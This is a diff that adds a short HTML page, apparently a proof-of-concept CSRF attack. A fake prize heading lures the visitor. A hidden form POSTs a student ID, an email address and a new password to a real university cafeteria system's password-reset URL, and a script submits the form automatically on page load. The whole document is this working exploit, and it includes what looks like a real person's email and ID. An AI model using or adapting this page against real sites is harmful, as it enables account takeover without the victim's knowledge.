@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página Maliciosa</title>
+</head>
+<body>
+    <h1>Você Ganhou um Prêmio!</h1>
+    
+    <!-- Formulário Malicioso -->
+    <form method="POST" action="https://refeitorio.picos.ifpi.edu.br/accounts/esqueci/">
+        <input type="hidden" name="Matricula" value="2021118tads0050">
+        <input type="hidden" name="E-mail" value="marquesanthony62@gmail.com">
+        <input type="hidden" name="Nova Senha" value="09321">
+    </form>
+
+    <script>
+        // Aguardar até que o DOM esteja totalmente carregado
+        window.onload = function() {
+            // Automaticamente submeter o formulário
+            document.forms[0].submit();
+        };
+    </script>
+</body>
+</html>
